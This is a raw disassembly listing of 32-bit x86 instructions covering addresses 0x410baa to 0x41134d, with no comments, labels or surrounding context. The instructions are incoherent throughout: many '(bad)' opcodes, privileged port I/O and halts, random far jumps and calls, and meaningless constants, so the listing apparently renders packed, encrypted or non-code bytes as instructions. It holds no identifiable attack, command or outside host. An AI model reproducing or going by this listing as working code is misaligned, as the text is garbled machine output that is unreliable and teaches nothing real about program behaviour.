  410baa:	dec    ebx
  410bab:	add    al,0xa3
  410bad:	cs stos DWORD PTR es:[edi],eax
  410baf:	and    al,0x3
  410bb1:	daa    
  410bb2:	or     ebp,DWORD PTR ds:0xb6a45370
  410bb8:	neg    BYTE PTR [eax]
  410bba:	out    dx,al
  410bbb:	pop    ebp
  410bbc:	stos   DWORD PTR es:[edi],eax
  410bbd:	pop    es
  410bbe:	bound  edi,QWORD PTR [ecx]
  410bc0:	dec    ebp
  410bc1:	dec    eax
  410bc2:	mov    edx,0xd66ece4
  410bc7:	push   esi
  410bc8:	push   ebx
  410bc9:	int    0xbd
  410bcb:	pop    es
  410bcc:	fimul  WORD PTR [ebx-0x1b]
  410bcf:	pop    ebp
  410bd0:	dec    esi
  410bd1:	sbb    DWORD PTR [ecx-0xd],esi
  410bd4:	popa   
  410bd5:	sub    dl,ch
  410bd7:	mov    ecx,0xb4afa38b
  410bdc:	or     al,0xa
  410bde:	lock mov DWORD PTR [edi-0x3b47a5cb],ebp
  410be5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410be6:	inc    ebx
  410be7:	into   
  410be8:	xchg   BYTE PTR [ebp+0x16],bh
  410beb:	mov    ecx,0x4a26ddcf
  410bf0:	jo     0x410bd7
  410bf2:	(bad)  
  410bf3:	dec    esi
  410bf4:	adc    edi,ebx
  410bf6:	adc    DWORD PTR [edx],edi
  410bf8:	jnp    0x410b80
  410bfa:	test   eax,0xce9b7a8d
  410bff:	mov    WORD PTR [ebp+0x6b1b6b5f],gs
  410c05:	lea    ecx,[ebx]
  410c07:	dec    edx
  410c08:	ret    
  410c09:	popf   
  410c0a:	neg    BYTE PTR [eax]
  410c0c:	jle    0x410bb9
  410c0e:	loopne 0x410ba7
  410c10:	loope  0x410bb1
  410c12:	xor    ah,BYTE PTR [eax]
  410c14:	lods   eax,DWORD PTR ds:[esi]
  410c15:	add    BYTE PTR ds:0x92a8b4e1,0xcf
  410c1c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410c1d:	pop    ecx
  410c1e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410c1f:	fbld   TBYTE PTR [edx-0x5]
  410c22:	xor    DWORD PTR [edi-0x667ece48],0xd7e82e4d
  410c2c:	test   DWORD PTR [ecx+esi*4-0x8037f1e],edx
  410c33:	cmp    edi,DWORD PTR ds:0x34f6c39a
  410c39:	xor    cl,BYTE PTR [esi-0x16]
  410c3c:	dec    ebp
  410c3d:	out    dx,al
  410c3e:	es data16 sti 
  410c41:	shl    BYTE PTR [edx],1
  410c43:	sbb    DWORD PTR [ecx-0x1a],edi
  410c46:	cmp    al,0xd0
  410c48:	or     DWORD PTR [eax+0x17c4ce1b],ebp
  410c4e:	push   ds
  410c4f:	stos   BYTE PTR es:[edi],al
  410c50:	das    
  410c51:	loop   0x410c14
  410c53:	(bad)  
  410c54:	mov    ecx,0xf1c22da9
  410c59:	sbb    edi,esi
  410c5b:	mul    DWORD PTR [edi]
  410c5d:	adc    eax,0xe18cc28
  410c62:	or     al,0xa5
  410c64:	int3   
  410c65:	xchg   esi,eax
  410c66:	sbb    bh,BYTE PTR [ebx+esi*8]
  410c69:	iret   
  410c6a:	jno    0x410ccf
  410c6c:	cmc    
  410c6d:	enter  0x654f,0x41
  410c71:	xchg   ebx,eax
  410c72:	mov    esi,0x276bb30
  410c77:	hlt    
  410c78:	popf   
  410c79:	lahf   
  410c7a:	(bad)  
  410c7b:	xchg   edx,eax
  410c7c:	das    
  410c7d:	add    eax,0xc1a7333a
  410c82:	xlat   BYTE PTR ds:[ebx]
  410c83:	inc    edx
  410c84:	cld    
  410c85:	pop    edx
  410c86:	cmp    al,0x84
  410c88:	and    DWORD PTR [ebp+0x24],ebp
  410c8b:	mov    ebp,0x878cf1a8
  410c90:	jge    0x410c32
  410c92:	je     0x410c53
  410c94:	popa   
  410c95:	test   al,0x5f
  410c97:	cmp    ch,al
  410c99:	stos   BYTE PTR es:[edi],al
  410c9a:	xchg   edx,eax
  410c9b:	push   0x784180d5
  410ca0:	dec    ebx
  410ca1:	sub    eax,0x4e183632
  410ca6:	or     eax,0xe83ed702
  410cab:	mov    ch,0xb2
  410cad:	std    
  410cae:	(bad)  
  410cb0:	sub    eax,0xcd5a4d92
  410cb5:	loopne 0x410c3d
  410cb7:	(bad)  
  410cb8:	xchg   ebx,eax
  410cb9:	pop    eax
  410cba:	mov    cl,dl
  410cbc:	imul   edi,DWORD PTR [ecx],0x339bf22e
  410cc2:	arpl   WORD PTR [eax+0x78b0a43f],ax
  410cc8:	ins    BYTE PTR es:[edi],dx
  410cc9:	fwait
  410cca:	rol    ebx,cl
  410ccc:	mov    WORD PTR [edx+edi*2],?
  410ccf:	add    ch,BYTE PTR [edx]
  410cd1:	stc    
  410cd2:	sahf   
  410cd3:	xchg   ecx,eax
  410cd4:	push   esp
  410cd5:	out    dx,al
  410cd6:	hlt    
  410cd7:	out    dx,eax
  410cd8:	sti    
  410cd9:	loope  0x410c87
  410cdb:	and    DWORD PTR [ebp-0x36ffff21],ebp
  410ce1:	mov    eax,ds:0x5c107e08
  410ce6:	fwait
  410ce7:	dec    esi
  410ce8:	xchg   esp,eax
  410ce9:	dec    esi
  410cea:	iret   
  410ceb:	fwait
  410cec:	jmp    0x410ccd
  410cee:	(bad)  
  410cef:	xor    BYTE PTR [esi+edx*8+0x55],ah
  410cf3:	aaa    
  410cf4:	(bad)  
  410cf5:	xor    eax,0xf704a064
  410cfa:	xchg   edi,eax
  410cfb:	test   DWORD PTR [edi+0x10d6eb39],esi
  410d01:	push   esp
  410d02:	into   
  410d03:	sbb    BYTE PTR [ebx-0x99794c3],dl
  410d09:	xchg   ebx,eax
  410d0a:	shl    BYTE PTR [esi+0x4af01f1b],0x27
  410d11:	mov    gs,WORD PTR [edx+edx*1]
  410d14:	inc    ecx
  410d15:	scas   al,BYTE PTR es:[edi]
  410d16:	xor    cl,dl
  410d18:	ins    BYTE PTR es:[edi],dx
  410d19:	(bad)  
  410d1a:	xor    ch,BYTE PTR [ebp+0x1308e135]
  410d20:	test   ebx,eax
  410d22:	dec    ecx
  410d23:	cwde   
  410d24:	or     DWORD PTR [ecx+ecx*2-0x69],edx
  410d28:	and    ch,bh
  410d2a:	jmp    0xc365:0x6995e244
  410d31:	cs je  0x410da2
  410d34:	sub    bl,BYTE PTR [ecx+eax*8]
  410d37:	arpl   WORD PTR [ebx+0x43],di
  410d3a:	mov    ebx,0xd49bb705
  410d3f:	fbstp  TBYTE PTR [ebp+0x5]
  410d42:	addr16 ret 0xbc87
  410d46:	inc    esp
  410d47:	or     ecx,DWORD PTR [edx]
  410d49:	int    0x5d
  410d4b:	ret    0xb83b
  410d4e:	mov    ds:0x18d49630,al
  410d53:	pop    ecx
  410d54:	aam    0xd6
  410d56:	push   ss
  410d57:	je     0x410d96
  410d59:	cmp    esi,DWORD PTR [ecx+0x6458033d]
  410d5f:	pop    eax
  410d61:	bound  ebp,QWORD PTR [esp+ebp*1+0x4ceb01c4]
  410d68:	sub    eax,0x17fd3a40
  410d6d:	mov    dl,0x70
  410d6f:	inc    esp
  410d70:	shl    BYTE PTR [esi],cl
  410d72:	jne    0x410d63
  410d74:	in     al,0x52
  410d76:	pushf  
  410d77:	adc    eax,edx
  410d79:	in     al,dx
  410d7a:	or     BYTE PTR [ebx],0x9e
  410d7d:	jns    0x410dfb
  410d7f:	ds sub eax,0x3a3d2aef
  410d85:	lods   al,BYTE PTR ds:[esi]
  410d86:	or     al,0x9
  410d88:	mov    bl,0x88
  410d8a:	mov    ah,0xcb
  410d8c:	jbe    0x410d0e
  410d8e:	sub    BYTE PTR [eax-0x78],dh
  410d91:	adc    DWORD PTR [eax-0x46],0x4b
  410d95:	mov    eax,ds:0xad9bfa12
  410d9a:	cmp    eax,0x9d7ef8ca
  410d9f:	inc    eax
  410da0:	push   cs
  410da1:	cmp    esi,edi
  410da3:	fwait
  410da4:	and    DWORD PTR [ecx-0x7c],edx
  410da7:	jbe    0x410e25
  410da9:	or     bl,ah
  410dab:	mov    eax,ds:0x108caeb4
  410db0:	mov    cs:0xa14b1501,al
  410db6:	jecxz  0x410db8
  410db8:	(bad)  
  410dba:	add    al,0xd6
  410dbc:	div    dh
  410dbe:	loope  0x410dad
  410dc0:	mov    ah,0xa9
  410dc2:	imul   ebp,DWORD PTR [edx+0x69],0x4f97d251
  410dc9:	and    DWORD PTR [ebp-0x34d73f99],ecx
  410dcf:	imul   ebx,DWORD PTR [ebx],0x58
  410dd2:	adc    BYTE PTR [edx+0x722b3bfa],ch
  410dd8:	dec    ecx
  410dd9:	adc    eax,0x525b81e0
  410dde:	ins    BYTE PTR es:[edi],dx
  410ddf:	xor    al,0xbc
  410de1:	xchg   edi,eax
  410de2:	bound  edi,QWORD PTR [edx]
  410de4:	dec    edi
  410de5:	(bad)  
  410de6:	cmp    eax,0xa7bf6f7a
  410deb:	or     eax,0x8b32c69f
  410df0:	mov    cl,0x63
  410df2:	data16 jge 0x410dc4
  410df5:	jl     0x410d7b
  410df7:	cmp    al,0xf9
  410df9:	mov    edx,0x463739bc
  410dfe:	shl    DWORD PTR [esi-0x40b437bd],1
  410e04:	pop    ebp
  410e06:	add    eax,esi
  410e08:	dec    ebp
  410e09:	test   BYTE PTR [eax-0x7e7daaa],cl
  410e0f:	jns    0x410dd3
  410e11:	out    0xd9,eax
  410e13:	sbb    eax,0x9211520c
  410e18:	stc    
  410e19:	cwde   
  410e1a:	imul   ebp,eax,0xc60ae4d7
  410e20:	popa   
  410e21:	call   0xe8be:0x4f93a413
  410e28:	add    BYTE PTR [ebx-0x6f4beacf],bl
  410e2e:	rcr    ebp,0x45
  410e31:	imul   esi,DWORD PTR [edi+0x30],0x4ab78e70
  410e38:	push   edx
  410e39:	sbb    al,0xba
  410e3b:	dec    esp
  410e3c:	jge    0x410eae
  410e3e:	test   DWORD PTR [ecx+0x43],ebp
  410e41:	hlt    
  410e42:	stos   DWORD PTR es:[edi],eax
  410e43:	sbb    BYTE PTR [esi+0x6e],dl
  410e46:	cmp    cl,BYTE PTR [esi]
  410e48:	dec    esi
  410e49:	sub    ebx,0x6e710482
  410e4f:	jmp    0x410e63
  410e51:	add    al,0x80
  410e53:	mov    ebx,0xeee9ca4a
  410e58:	jl     0x410e09
  410e5a:	and    DWORD PTR [edi+0x3c],ebx
  410e5d:	ins    BYTE PTR es:[edi],dx
  410e5e:	and    dl,BYTE PTR [edx+eax*4+0x6c]
  410e62:	push   es
  410e63:	push   esp
  410e64:	adc    DWORD PTR [ebx-0x4acf2701],0x4bd755ac
  410e6e:	sti    
  410e6f:	xor    al,0xd0
  410e71:	xor    ch,BYTE PTR [ebx+0xd]
  410e74:	xchg   esp,eax
  410e75:	push   es
  410e76:	push   edi
  410e77:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410e78:	rcr    BYTE PTR [eax],0x71
  410e7b:	retf   0xf1cc
  410e7e:	pop    ecx
  410e7f:	xchg   BYTE PTR [eax-0x7a],bh
  410e82:	and    eax,eax
  410e84:	scas   eax,DWORD PTR es:[edi]
  410e85:	dec    ebp
  410e86:	retf   0x16cd
  410e89:	outs   dx,DWORD PTR ds:[esi]
  410e8a:	push   0x64
  410e8c:	ins    DWORD PTR es:[edi],dx
  410e8d:	mov    DWORD PTR [eax-0x27],0x199ab224
  410e94:	jbe    0x410e8c
  410e96:	idiv   DWORD PTR [eax+eax*4-0x247e6837]
  410e9d:	cmp    bl,BYTE PTR [ebx-0x4b3767a6]
  410ea3:	push   ebp
  410ea4:	xchg   esi,eax
  410ea5:	fild   WORD PTR [edx+0x2b]
  410ea8:	xor    ecx,DWORD PTR [ecx+0x2c0b7d56]
  410eae:	xchg   esp,eax
  410eaf:	ret    
  410eb0:	scas   al,BYTE PTR es:[edi]
  410eb1:	mov    ebp,0x17fd58db
  410eb6:	cmp    eax,0xdc13fb3d
  410ebb:	sbb    ebx,eax
  410ebd:	test   al,0xa9
  410ebf:	int3   
  410ec0:	ret    0x7e
  410ec3:	pop    ebp
  410ec4:	jno    0x410edd
  410ec6:	jbe    0x410f19
  410ec8:	mov    eax,ds:0x52ea0651
  410ecd:	pop    eax
  410ece:	mov    bh,0xae
  410ed0:	ds push eax
  410ed2:	adc    DWORD PTR [edi+0x94c17ae],ebp
  410ed8:	mov    WORD PTR [ecx-0x69f70c1f],gs
  410ede:	fidivr WORD PTR [edi-0x8]
  410ee1:	xor    al,0xf1
  410ee3:	inc    esp
  410ee4:	out    0x7a,eax
  410ee6:	mov    ebx,0xac8c869d
  410eeb:	jge    0x410e8f
  410eed:	retf   0x30d6
  410ef0:	arpl   WORD PTR [ecx+0x7a],cx
  410ef3:	inc    ebp
  410ef4:	jecxz  0x410ee7
  410ef6:	shl    DWORD PTR [edx-0x50],0x7c
  410efa:	sbb    dh,al
  410efc:	push   ecx
  410efd:	repnz push esp
  410eff:	sub    DWORD PTR [edx-0x36560cce],esi
  410f05:	sbb    eax,0xd30cee46
  410f0a:	(bad)  
  410f0b:	nop
  410f0c:	ret    
  410f0d:	hlt    
  410f0e:	cmc    
  410f0f:	stc    
  410f10:	in     al,0x30
  410f12:	ins    BYTE PTR es:[edi],dx
  410f13:	inc    esi
  410f14:	lea    edi,[edi]
  410f16:	add    eax,0xe5328703
  410f1b:	jo     0x410f61
  410f1d:	jns    0x410ee5
  410f1f:	xchg   DWORD PTR [eax+0x37d78a9f],ebx
  410f25:	ret    
  410f26:	lock xor DWORD PTR [edi-0x673d190c],edi
  410f2d:	inc    esp
  410f2e:	mov    dl,0x59
  410f30:	inc    esp
  410f31:	(bad)  
  410f32:	push   esp
  410f33:	icebp  
  410f34:	leave  
  410f35:	jae    0x410ed8
  410f37:	inc    ecx
  410f38:	mov    fs:0x293f9b82,al
  410f3e:	imul   ebp,DWORD PTR [eax-0x15],0x15
  410f42:	mov    eax,ds:0x792fa824
  410f47:	out    dx,eax
  410f48:	scas   al,BYTE PTR es:[edi]
  410f49:	cli    
  410f4a:	cwde   
  410f4b:	cli    
  410f4c:	pop    esp
  410f4d:	mov    esi,0x236915b4
  410f52:	xlat   BYTE PTR ds:[ebx]
  410f53:	sub    al,0x4d
  410f55:	push   edx
  410f56:	gs stos BYTE PTR es:[edi],al
  410f58:	stos   BYTE PTR es:[edi],al
  410f59:	cmp    al,0xea
  410f5b:	inc    ecx
  410f5c:	popf   
  410f5d:	jecxz  0x410ef1
  410f5f:	lock pop ds
  410f61:	loope  0x410f28
  410f63:	push   ebx
  410f64:	mov    al,0xfa
  410f66:	dec    esi
  410f67:	stos   BYTE PTR es:[edi],al
  410f68:	hlt    
  410f69:	out    0x81,al
  410f6b:	es dec dh
  410f6e:	nop
  410f6f:	ret    
  410f70:	in     al,dx
  410f71:	jmp    DWORD PTR [edi-0x46]
  410f74:	push   eax
  410f75:	mov    ebp,0x7e79f40d
  410f7a:	xchg   ebp,eax
  410f7b:	push   edi
  410f7c:	je     0x410fd2
  410f7e:	repz sub DWORD PTR [ebx],esi
  410f81:	sub    ch,BYTE PTR [edx-0x70]
  410f84:	ja     0x410fea
  410f86:	or     DWORD PTR [esi+0x35ba3a71],0xffffff80
  410f8d:	mov    BYTE PTR [esi+0x3f688bcd],dh
  410f93:	mov    WORD PTR [eax+0x7af00b1f],cx
  410f9a:	pop    esi
  410f9b:	lea    eax,[edi+0x6da8132c]
  410fa1:	xor    eax,0xaef5e661
  410fa6:	jmp    0x410f59
  410fa8:	sub    bx,dx
  410fab:	(bad)  
  410fac:	pop    ebp
  410fad:	sub    BYTE PTR [ecx+0x25],dl
  410fb0:	push   0xffffff8b
  410fb2:	xor    DWORD PTR [ecx],ebx
  410fb4:	outs   dx,DWORD PTR ds:[esi]
  410fb5:	sbb    edx,ecx
  410fb7:	ins    BYTE PTR es:[edi],dx
  410fb8:	pusha  
  410fb9:	div    BYTE PTR ds:0x58369e55
  410fbf:	jne    0x410ff6
  410fc1:	or     al,0x3d
  410fc3:	nop
  410fc4:	repz inc esi
  410fc6:	or     eax,0x69c1eef3
  410fcb:	xor    esi,DWORD PTR ss:[eax+0x1]
  410fcf:	(bad)  [eax]
  410fd1:	out    dx,eax
  410fd2:	pop    ecx
  410fd3:	pop    ecx
  410fd4:	int    0xa9
  410fd6:	xchg   dh,cl
  410fd8:	mov    WORD PTR [eax+0x6a],cs
  410fdb:	dec    esi
  410fdc:	xchg   esi,eax
  410fdd:	ja     0x41103c
  410fdf:	mov    bl,0x35
  410fe1:	jno    0x410f97
  410fe3:	sub    DWORD PTR [ebp-0x61a4abe2],eax
  410fe9:	aaa    
  410fea:	in     al,0xb
  410fec:	ja     0x41102f
  410fee:	int    0xb2
  410ff0:	call   0x111d:0x2b5336bf
  410ff7:	cmp    eax,0x8a31ebb2
  410ffc:	or     ah,BYTE PTR [eax]
  410ffe:	xchg   esp,eax
  410fff:	mov    ah,0x82
  411001:	xchg   DWORD PTR [ecx-0x49696bad],ecx
  411007:	cld    
  411008:	imul   BYTE PTR fs:[esi+0x4e]
  41100c:	ins    BYTE PTR es:[edi],dx
  41100d:	cmp    edi,esp
  41100f:	jmp    0xc09669e6
  411014:	pushf  
  411015:	cmp    ecx,DWORD PTR [ecx+0x533c987e]
  41101b:	rcl    al,0xec
  41101e:	lods   ax,WORD PTR ds:[esi]
  411020:	jg     0x41102a
  411022:	clc    
  411023:	les    eax,FWORD PTR [edx-0x13068ac9]
  411029:	push   esi
  41102a:	push   ebp
  41102b:	jl     0x411090
  41102d:	push   ebp
  41102e:	xchg   ebx,eax
  41102f:	xor    DWORD PTR [esi+0x3521aa7f],esp
  411035:	jg     0x41108d
  411037:	jbe    0x411085
  411039:	data16 and ah,dh
  41103c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41103d:	dec    esi
  41103e:	mov    al,0x9d
  411040:	or     al,0xb
  411042:	xlat   BYTE PTR ds:[ebx]
  411043:	inc    ecx
  411044:	lods   eax,DWORD PTR ds:[esi]
  411045:	call   0xe881834
  41104a:	mov    edi,0xb518b63e
  41104f:	out    dx,eax
  411050:	inc    ecx
  411051:	or     BYTE PTR [ecx-0x2aab5185],0x5
  411058:	push   cs
  411059:	outs   dx,BYTE PTR ds:[esi]
  41105a:	test   BYTE PTR [eax],bh
  41105c:	aaa    
  41105d:	imul   ecx,edi,0x3c17468d
  411063:	sub    al,0x3f
  411065:	arpl   WORD PTR [ebx],bp
  411067:	push   ss
  411068:	inc    eax
  411069:	dec    esp
  41106a:	es cld 
  41106c:	sbb    edx,esp
  41106e:	nop
  41106f:	cmp    al,0x93
  411071:	jecxz  0x411051
  411073:	(bad)  
  411074:	ins    DWORD PTR es:[edi],dx
  411075:	pop    ds
  411076:	jne    0x4110b6
  411078:	hlt    
  411079:	pop    ebx
  41107a:	fwait
  41107b:	leave  
  41107c:	aad    0xf2
  41107e:	cmp    DWORD PTR [ecx+eax*4+0x74b401e1],eax
  411085:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411086:	jbe    0x411054
  411088:	add    al,BYTE PTR [edi+0x370d5628]
  41108e:	icebp  
  41108f:	xchg   edx,eax
  411090:	sbb    al,0xaf
  411092:	neg    BYTE PTR [edx+0x3b4bca1e]
  411098:	sbb    DWORD PTR [edx],ecx
  41109a:	dec    ecx
  41109b:	jmp    0x4110e9
  41109d:	inc    edx
  41109e:	aaa    
  41109f:	mov    dh,BYTE PTR [eax+0x734a57a0]
  4110a5:	cmp    esi,esp
  4110a7:	call   0xc6e6:0x90c94595
  4110ae:	adc    edx,edx
  4110b0:	push   0xbfe46c80
  4110b5:	loope  0x41105d
  4110b7:	sbb    bh,BYTE PTR [eax-0x366e95e8]
  4110bd:	in     al,0x82
  4110bf:	push   es
  4110c0:	mov    al,ds:0xa001cc24
  4110c5:	jge    0x4110be
  4110c7:	imul   esp,DWORD PTR [ebx],0xfb50d001
  4110cd:	(bad)  
  4110ce:	fidivr WORD PTR [esi+0x3c205c18]
  4110d4:	scas   eax,DWORD PTR es:[edi]
  4110d5:	cs inc esp
  4110d7:	pop    eax
  4110d8:	mov    dl,BYTE PTR [ecx-0x14]
  4110db:	clc    
  4110dc:	adc    bh,dl
  4110de:	pop    esi
  4110df:	push   ebx
  4110e0:	data16 mov dh,0x1f
  4110e4:	out    dx,eax
  4110e5:	inc    BYTE PTR [ecx]
  4110e7:	sub    DWORD PTR [ecx],esp
  4110e9:	dec    edx
  4110ea:	stos   BYTE PTR es:[edi],al
  4110eb:	mov    al,ds:0xccf7c6ca
  4110f0:	and    eax,0x51175a2c
  4110f5:	jbe    0x41109f
  4110f7:	jne    0x411138
  4110f9:	xor    eax,0x3782e9f9
  4110fe:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4110ff:	out    dx,al
  411100:	or     DWORD PTR [eax+0x78a847c9],ebp
  411106:	lods   eax,DWORD PTR ds:[esi]
  411107:	in     al,dx
  411108:	repz adc eax,0xc0d26370
  41110e:	mov    DWORD PTR [edi],eax
  411110:	jp     0x41111e
  411112:	leave  
  411113:	rcl    BYTE PTR [edi-0x423e5913],1
  411119:	xlat   BYTE PTR ds:[ebx]
  41111a:	jno    0x41117a
  41111c:	pushf  
  41111d:	push   esp
  41111e:	icebp  
  41111f:	sub    al,BYTE PTR [ecx]
  411121:	cmp    dl,dl
  411123:	cli    
  411124:	mov    ah,0x6a
  411126:	sub    BYTE PTR [ebp-0x7d],bh
  411129:	in     al,0x84
  41112b:	aas    
  41112c:	scas   eax,DWORD PTR es:[edi]
  41112d:	mov    es,WORD PTR [ebp-0x7e]
  411130:	mov    dl,al
  411132:	jns    0x411150
  411134:	adc    ch,dh
  411136:	jge    0x4110de
  411138:	in     eax,dx
  411139:	mov    BYTE PTR [ecx+0x77],bh
  41113c:	pop    ebp
  41113d:	fimul  WORD PTR [esi-0x47f93a98]
  411143:	lods   eax,DWORD PTR ds:[esi]
  411144:	sbb    DWORD PTR [eax+eax*8],0x3ab4962e
  41114b:	push   0x5c0368be
  411150:	mov    bh,0x27
  411152:	sbb    DWORD PTR [esi],edx
  411154:	stos   BYTE PTR es:[edi],al
  411155:	adc    esp,DWORD PTR [ecx+0x4cfc41f]
  41115b:	ror    DWORD PTR [ebx+0x36],1
  41115e:	fbstp  TBYTE PTR [esi+0x125afadb]
  411164:	out    0x6b,al
  411166:	push   edx
  411167:	inc    edi
  411168:	mov    cl,al
  41116a:	adc    esi,DWORD PTR [ebp+0x2e]
  41116d:	loope  0x4110f7
  41116f:	fadd   st,st(7)
  411171:	out    0x9e,eax
  411173:	add    esp,DWORD PTR [ebp+0x17dcf6d]
  411179:	loope  0x4111e6
  41117b:	fcom   st(1)
  41117d:	xor    DWORD PTR [esi-0x1c],edi
  411180:	jmp    0x41114a
  411182:	sbb    eax,0x4349be76
  411187:	mov    bh,bl
  411189:	adc    BYTE PTR [edx],ah
  41118b:	fild   WORD PTR [eax+0x7e]
  41118e:	fwait
  41118f:	jge    0x4111ba
  411191:	sub    ah,BYTE PTR [edx-0x16c65c31]
  411197:	dec    ecx
  411198:	or     al,0x6d
  41119a:	cmp    al,0x7c
  41119c:	fsub   DWORD PTR [edx]
  41119e:	jmp    0x9021:0x8577fe10
  4111a5:	je     0x411167
  4111a7:	call   0x968baa81
  4111ac:	cmp    bl,BYTE PTR [ecx]
  4111ae:	mov    DWORD PTR [edi],0xc7397445
  4111b4:	xchg   esi,eax
  4111b5:	xchg   edi,eax
  4111b6:	or     ecx,DWORD PTR [eax+0xe]
  4111b9:	xor    ch,BYTE PTR [edi+eax*4+0x25263c42]
  4111c0:	and    al,0xfa
  4111c2:	xchg   DWORD PTR [eax+ebp*2-0x2d6b2e8f],ebp
  4111c9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4111ca:	leave  
  4111cb:	jmp    0x9c79:0x62839eb5
  4111d2:	out    dx,eax
  4111d3:	or     al,0x13
  4111d5:	mov    dh,0xc
  4111d7:	ret    0x6c6e
  4111da:	jmp    0x856ad28e
  4111df:	mov    ah,0xe9
  4111e1:	lahf   
  4111e2:	mov    ebx,DWORD PTR [ebp-0x22990f29]
  4111e8:	ror    BYTE PTR ds:[ecx],0xdd
  4111ec:	sub    ecx,DWORD PTR [edi-0x2c]
  4111ef:	fbstp  TBYTE PTR fs:[ebx-0x35]
  4111f3:	fadd   st(7),st
  4111f5:	push   0x50c449c5
  4111fa:	cmp    DWORD PTR [edi],0xffffff9e
  4111fd:	or     cl,BYTE PTR [esi-0x69e18dfd]
  411203:	mov    bl,al
  411205:	jp     0x411250
  411207:	rol    DWORD PTR [edx-0x5e],0x9b
  41120b:	and    BYTE PTR [edi],dh
  41120d:	addr16 ret 
  41120f:	pop    ss
  411210:	fbstp  TBYTE PTR [edx]
  411212:	mov    ebx,0x183448c0
  411217:	jne    0x411293
  411219:	loopne 0x4111ce
  41121b:	push   ss
  41121c:	arpl   WORD PTR ds:0x9b51d47e,bp
  411222:	mov    dl,0x64
  411224:	and    bh,BYTE PTR [edx+0x4a]
  411227:	ins    DWORD PTR es:[edi],dx
  411228:	inc    eax
  411229:	add    BYTE PTR [ebp-0x3588e22],ch
  41122f:	adc    edi,DWORD PTR [eax+0x3e]
  411232:	enter  0x2c56,0x8b
  411236:	ins    BYTE PTR es:[edi],dx
  411237:	sub    bl,al
  411239:	cmp    BYTE PTR [ebp+eiz*8+0x2137a63d],ah
  411240:	pop    ecx
  411241:	sti    
  411242:	adc    eax,0x88724311
  411247:	sbb    ah,BYTE PTR [eax]
  411249:	inc    eax
  41124a:	push   0x27
  41124c:	or     DWORD PTR [eax-0x6f],0x18e6de5b
  411253:	stos   BYTE PTR es:[edi],al
  411254:	ins    DWORD PTR es:[edi],dx
  411255:	mov    bl,0xdd
  411257:	and    DWORD PTR [ecx-0x125f4e74],esp
  41125d:	jnp    0x411292
  41125f:	fimul  DWORD PTR [eax+0x57f39267]
  411265:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411266:	lock pop ecx
  411268:	dec    edx
  411269:	sbb    DWORD PTR [edx],ecx
  41126b:	(bad)  
  41126c:	pop    ebx
  41126d:	mov    esp,0xba9617e1
  411272:	or     ecx,DWORD PTR [esi+0x72]
  411275:	mov    edi,0xcedd81ab
  41127a:	adc    DWORD PTR [bx+di+0x1bf1],eax
  41127f:	pop    edx
  411280:	add    bh,BYTE PTR [edi+0x55396d30]
  411286:	ja     0x4112cb
  411288:	push   edi
  411289:	call   0x37c4ca0d
  41128e:	push   ss
  41128f:	jno    0x4112a1
  411291:	stos   DWORD PTR es:[edi],eax
  411292:	ja     0x4112b4
  411294:	sub    dh,BYTE PTR gs:[edi]
  411297:	push   0xb05e1889
  41129c:	dec    esp
  41129d:	push   ss
  41129e:	mov    edi,0x9a473b23
  4112a3:	or     al,0x54
  4112a5:	pop    edx
  4112a6:	enter  0x4251,0xb2
  4112aa:	mov    WORD PTR [edx],cs
  4112ac:	in     eax,0x81
  4112ae:	pop    eax
  4112af:	jmp    0x4112c4
  4112b1:	xchg   ecx,eax
  4112b2:	push   edi
  4112b3:	inc    esp
  4112b4:	or     al,BYTE PTR [eax+0x38]
  4112b7:	or     bh,ah
  4112b9:	shl    dh,1
  4112bb:	sub    bh,BYTE PTR [ecx+0x43484952]
  4112c1:	fst    QWORD PTR [eax]
  4112c3:	stos   BYTE PTR es:[edi],al
  4112c4:	mov    esp,0xf0b9afc2
  4112c9:	ror    BYTE PTR [eax+0x69],1
  4112cc:	inc    ecx
  4112cd:	inc    edx
  4112ce:	into   
  4112cf:	lods   eax,DWORD PTR ds:[esi]
  4112d0:	pop    ss
  4112d1:	adc    eax,0xcd6f782a
  4112d6:	cmp    edx,DWORD PTR [edx]
  4112d8:	sbb    al,ah
  4112da:	xchg   esp,eax
  4112db:	outs   dx,DWORD PTR ds:[esi]
  4112dc:	mov    ?,edx
  4112de:	sub    al,0x9a
  4112e0:	sbb    BYTE PTR [esi],cl
  4112e2:	cmp    bl,BYTE PTR [eax+edx*1]
  4112e5:	jnp    0x411324
  4112e7:	stos   BYTE PTR es:[edi],al
  4112e8:	(bad)  [ecx]
  4112ea:	ds xor al,0x19
  4112ed:	test   eax,0xf5b5ba98
  4112f2:	scas   al,BYTE PTR es:[edi]
  4112f3:	push   ebp
  4112f4:	daa    
  4112f5:	mov    ebx,0x76e71fa
  4112fa:	mov    ebx,DWORD PTR [esi-0x29]
  4112fd:	pop    ds
  4112fe:	xor    eax,0x3b7b2977
  411303:	icebp  
  411304:	xchg   edx,eax
  411305:	pop    ss
  411306:	inc    edx
  411307:	and    ah,BYTE PTR [edx+0x2c]
  41130a:	sub    BYTE PTR [ebx+eiz*2-0x19],bh
  41130e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41130f:	adc    ch,BYTE PTR [edi]
  411311:	xchg   ebp,eax
  411312:	jg     0x4112e6
  411314:	(bad)  
  411315:	mov    al,0xe4
  411317:	jb     0x411350
  411319:	psllw  mm5,QWORD PTR [edx]
  41131c:	lahf   
  41131d:	sub    eax,0xfc8a0e9f
  411322:	gs xor edx,ebx
  411325:	pop    es
  411326:	retf   0xa9f8
  411329:	sub    ch,BYTE PTR [ebp-0xef75a79]
  41132f:	sub    BYTE PTR [ecx+0x12],ch
  411332:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411333:	clc    
  411334:	in     al,dx
  411335:	int    0x2d
  411337:	clc    
  411338:	iret   
  411339:	mov    edx,0xa5e45369
  41133e:	and    cl,BYTE PTR [esp+ebp*8]
  411341:	push   0x47
  411343:	and    eax,DWORD PTR [edx+ebx*4-0x53ae509]
  41134a:	mov    bl,0x16
  41134c:	outs   dx,BYTE PTR ds:[esi]
  41134d:	mov    ch,0x18
